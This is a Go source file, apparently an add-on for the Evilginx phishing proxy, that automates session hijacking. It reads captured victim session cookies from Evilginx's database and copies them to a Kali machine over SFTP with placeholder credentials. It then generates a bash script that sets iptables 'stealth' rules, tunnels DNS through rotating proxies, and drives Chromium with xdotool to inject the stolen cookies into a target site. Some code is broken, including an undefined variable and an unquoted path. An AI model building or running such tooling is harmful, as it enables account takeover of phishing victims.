package core

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
	"io"
	"strconv"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func TriggerChromium() error {
    // 1. Get latest session
    session, err := getLatestSession()
    if err != nil {
        return fmt.Errorf("Session error: %v", err)
    }

    // 2. Get proxy configuration
    proxyType, proxyAddr, proxyPort, proxyUser, proxyPass, _, err := getProxyConfig()
    if err != nil {
        return fmt.Errorf("proxy config error: %v", err)
    }

    // 3. Apply proxy configuration to local machine automation script
    script := generateLocalScript(proxyType, proxyAddr, proxyPort, proxyUser, proxyPass)

    // 4. EXPORT COOKIE FILE FROM VPS TO LOCAL MACHINE ⚠️
    if err := exportCookies(session, /Local/Machine/Path/cookies.json); err != nil {
        return fmt.Errorf("Export error: %v", err)
    }

    // 5. Write local machine automations file
    if err := os.WriteFile("/tmp/chromium_automation.sh", []byte(script), 0755); err != nil {
        return fmt.Errorf("Export error: %v", err)
    }

    // TRANSFER AUTOMATION FILE TO LOCAL MACHINE
    if err := exportScript("/tmp/chromium_automation.sh", "/Local/Machine/Path/chromium_automation.sh"); err != nil {
        return fmt.Errorf("script transfer failed: %v", err)
    }

    // Execute LOCALLY via SSH (not on VPS!), REPLACE KALIUSER WITH YOUT KALI USER ⚠️
    cmd := exec.Command("ssh", "KaliUser@localhost", "timeout", "300", "bash", "/Local/Machine/Path/chromium_automation.sh")
    if err := cmd.Start(); err != nil {
        return fmt.Errorf("local execution failed: %v", err)
    }

    // 6. Rotate proxy (non-blocking)
    go func() {
        if err := SwitchProxy(); err != nil {
            log.Printf("proxy rotation warning: %v", err)
        }
    }()

    return nil
}

type ProxyConfig struct {
	Type           string `json:"type"`
	Address        string `json:"address"`
	Port           int    `json:"port"`
	Username       string `json:"username"`
	Password       string `json:"password"`
	Enabled        bool   `json:"enabled"`
}

// THIS WOULD RETRIEVE THE LATEST SESSION FROM EVILGINX
func getLatestSession() ([]byte, error) {
    file, err := os.Open("/root/.evilginx/data.db")
    if err != nil { 
        return nil, fmt.Errorf("failed to open data.db: %v", err) 
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    var currentSession string
    var captureNext bool

    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
// PREFIX ⚠️
        if strings.HasPrefix(line, "$") {
            captureNext = true
            currentSession = ""
            continue
        }

        if captureNext && strings.HasPrefix(line, "{") {
            currentSession = line
        }
    }

    if latestSession == "" {
        return nil, fmt.Errorf("no valid session data found")
    }
    return []byte(currentSession), nil
}

func exportCookies(rawData []byte, path string) error {
    config := &ssh.ClientConfig{
// INSERT YOU LOCAL MACHINE USERNAME HERE ⚠️
        User: "KaliUser",
        Auth: []ssh.AuthMethod{
// INSERT YOUR LOCAL MACHINE PASSWORD HERE ⚠️
            ssh.Password("yourpassword"),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    }

    client, err := ssh.Dial("tcp", "localhost:22", config)
    if err != nil {
        return fmt.Errorf("SSH failed: %v", err)
    }
    defer client.Close()

    sftpClient, err := sftp.NewClient(client)
    if err != nil {
        return fmt.Errorf("SFTP failed: %v", err)
    }
    defer sftpClient.Close()

    dstFile, err := sftpClient.Create(path)
    if err != nil {
        return fmt.Errorf("file create failed: %v", err)
    }
    defer dstFile.Close()

    if _, err := dstFile.Write(rawData); err != nil {
        return fmt.Errorf("failed to write raw data: %v", err)
    }

    return nil
}

func exportScript(localPath, remotePath string) error {
    config := &ssh.ClientConfig{
// INSERT YOU LOCAL MACHINE USERNAME HERE ⚠️
        User: "KaliUser",
        Auth: []ssh.AuthMethod{
// INSERT YOUR LOCAL MACHINE PASSWORD HERE ⚠️
            ssh.Password("yourpassword"),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    }

    conn, err := ssh.Dial("tcp", "localhost:22", config)
    if err != nil {
        return err
    }
    defer conn.Close()

    sftp, err := sftp.NewClient(conn)
    if err != nil {
        return err
    }
    defer sftp.Close()

    srcFile, err := os.Open(localPath)
    if err != nil {
        return err
    }
    defer srcFile.Close()

    dstFile, err := sftp.Create(remotePath)
    if err != nil {
        return err
    }
    defer dstFile.Close()

    if _, err := io.Copy(dstFile, srcFile); err != nil {
        return err
    }

    return nil
}

func getProxyConfig() (string, string, int, string, string, bool, error) {
    configPath := "/root/.evilginx/config.json"
    data, err := os.ReadFile(configPath)
    if err != nil {
        return "", "", 0, "", "", false, fmt.Errorf("config read error: %v", err)
    }

    var config struct {
        Proxy struct {
            Type     string `json:"type"`
            Address  string `json:"address"`
            Port     int    `json:"port"`
            Username string `json:"username"`
            Password string `json:"password"`
            Enabled  bool   `json:"enabled"`
        } `json:"proxy"`
    }

    if err := json.Unmarshal(data, &config); err != nil {
        return "", "", 0, "", "", false, fmt.Errorf("config parse error: %v", err)
    }

    return config.Proxy.Type, 
           config.Proxy.Address, 
           config.Proxy.Port, 
           config.Proxy.Username, 
           config.Proxy.Password, 
           config.Proxy.Enabled, 
           nil
}

func generateLocalScript(proxyType, proxyAddr string, proxyPort int, proxyUser, proxyPass string) string {
    // EACH NEW CHROMIUM PROFILE NAME WILL BE ITS PROXY IP ADDRESS
    profileName := strings.Split(proxyAddr, ":")[0]

    return fmt.Sprintf(`#!/bin/bash
# PROXY CONFIG FROM EVILGINX (getProxyConfig)
# Open Kali Workspace ⚠️
xdotool key alt+insert

PROXY_TYPE="%s"
PROXY_ADDR="%s"
PROXY_PORT="%d"
PROXY_AUTH="%s:%s"

# Use proxy IP as profile directory name
PROFILE_DIR="$HOME/chrome-profiles/%s"
mkdir -p "$PROFILE_DIR/Default"

cat > "$PROFILE_DIR/First Run" <<'EOF'
[General]
opted_into_activity_logging = false
EOF

cat > "$PROFILE_DIR/Default/Preferences" <<'EOF'
{
  "profile": {
    "name": "%s"
  },
  "browser": {
    "has_seen_welcome_page": true
  }
}

EOF

# ACTIVATE NETWORK STEALTH
sudo iptables -A OUTPUT -p udp --dport 443 -j REJECT
sudo iptables -P OUTPUT DROP
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A OUTPUT -d $PROXY_ADDR -p tcp --dport $PROXY_PORT -j ACCEPT
sudo iptables -A OUTPUT -p udp -d 127.0.0.1 --dport 53 -j ACCEPT
dns2socks $PROXY_ADDR:$PROXY_PORT 8.8.8.8:53 127.0.0.1:53 &

# LAUNCH CHROMIUM
chromium --user-data-dir="$PROFILE_DIR" --proxy-server="$PROXY_TYPE://$PROXY_AUTH@$PROXY_ADDR:$PROXY_PORT" --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE localhost" --load-extension="/Local/Machine/Path/J2TEAM_COOKIES/okpidcojinmlaakglciglbpcpajaibco-1.0.4-Crx4Chrome.com/" --no-default-browser-check --no-first-run --start-maximized

# Wait for browser to start
sleep 4

WID=$(xdotool search --class "chromium" | head -1)
xdotool windowactivate --sync $WID

# Press Tab 4 times
for i in {1..4}; do
xdotool key Tab
sleep 1
done

# Press Enter
xdotool key Return
sleep 1

# Press ctrl+L
xdotool key ctrl+l
sleep 1

# Press Right key
xdotool key Right
sleep 1

# Press ctrl+Left key
xdotool key ctrl+Left
sleep 1

# Press ctrl+Shift+Up key
xdotool key ctrl+Shift+Up
sleep 1

# Type chrome-extension://
xdotool type "chrome-extension://"
sleep 1

# Press ctrl+Right key
xdotool key ctrl+Right
sleep 1

# REPLACE THE BASE64-ENCODED STRING WITH THE FULL LOGIN PAGE URL OF YOUR TARGET SITE (e.g., "https://legitsite.example.com/login"). ⚠️
xdotool type "/popup.html?url=aHR0cHM6Ly9leGFtcGxlLmNvbS9sb2dpbg=="

# Press Enter and access extension page
xdotool key Return
sleep 1

# Press Tab 6 times and focus cookie file submission button
for i in {1..6}; do
xdotool key Tab
sleep 1
done

# Press Enter and access file manager
xdotool key Return
sleep 1

# Focus file manager address bar
xdotool key ctrl+l
sleep 1

# COOKIE INJECTOR WILL EXTRACT THE COOKIE FILE EXPORTED FROM VPS TO LOCAL MACHINE ⚠️
xdotool type "/Local/Machine/Path/cookies.json"
sleep 1

# Pres enter in order to submit cookie file
xdotool key Return
sleep 4

# Close Chromium window
xdotool key alt+f4

# UNDO ALL NETWORK STEALTH
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -t mangle -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

# Close Kali Workspace ⚠️
xdotool key alt+BackSpace
`, proxyType, proxyAddr, proxyPort, proxyUser, proxyPass, profileName, profileName)
}

// THE FUNCTION BELOW UPDATES EVILGINX'S IP AND PORT USING THE FIRST LINE FROM proxies.txt ON YOUR VPS
func SwitchProxy() {
    // PROXIES FILE ON VPS (REPLACE WITH THE PATH TO YOUR `proxies.txt`) ⚠️
    filePath := "/VPS/Path/proxies.txt"
    file, err := os.Open(filePath)
    if err != nil {
        fmt.Println("Error opening proxies file:", err)
        return
    }
    defer file.Close()

    // COLLECT FIRST PROXY (FORMAT: "IP:PORT")
    scanner := bufio.NewScanner(file)
    var proxyLine string
    if scanner.Scan() {
        proxyLine = scanner.Text()
    }

    if err := scanner.Err(); err != nil {
        fmt.Println("Error reading proxies file:", err)
        return
    }

    // SPLIT INTO IP AND PORT COMPONENTS
    proxyParts := strings.Split(proxyLine, ":")
    if len(proxyParts) != 2 {
        fmt.Println("Invalid proxy format in proxies.txt - expected IP:PORT")
        return
    }
    proxyAddress := proxyParts[0]
    proxyPort, err := strconv.Atoi(proxyParts[1])
    if err != nil {
        fmt.Println("Invalid port number in proxies.txt:", err)
        return
    }

    // REMOVE USED PROXY FROM proxies.txt
    content, err := os.ReadFile(filePath)
    if err != nil {
        fmt.Println("Error reading proxies file:", err)
        return
    }

    lines := strings.Split(string(content), "\n")
    if len(lines) > 1 {
        lines = lines[1:]
    }

    err = os.WriteFile(filePath, []byte(strings.Join(lines, "\n")), 0644)
    if err != nil {
        fmt.Println("Error writing to proxies file:", err)
        return
    }

    // READ EVILGINX PROXY CONFIGURATION
    configPath := "/root/.evilginx/config.json"
    configData, err := os.ReadFile(configPath)
    if err != nil {
        fmt.Println("Error reading config file:", err)
        return
    }

    // PARSE EVILGINX PROXY CONFIGURATION
    var config map[string]interface{}
    if err := json.Unmarshal(configData, &config); err != nil {
        fmt.Println("Error parsing config JSON:", err)
        return
    }

    // UPDATE EVILGINX PROXY SETTINGS
    if proxySection, ok := config["proxy"].(map[string]interface{}); ok {
        proxySection["address"] = proxyAddress
        proxySection["port"] = proxyPort
        proxySection["enabled"] = true
    } else {
        fmt.Println("Error: 'proxy' section not found in config")
        return
    }

    // WRITE UPDATED CONFIGURATION BACK TO FILE
    updatedConfig, err := json.MarshalIndent(config, "", "  ")
    if err != nil {
        fmt.Println("Error marshaling updated config:", err)
        return
    }

    if err := os.WriteFile(configPath, updatedConfig, 0644); err != nil {
        fmt.Println("Error writing updated config:", err)
        return
    }

    fmt.Printf("Proxy switched successfully to: %s:%d\n", proxyAddress, proxyPort)
}
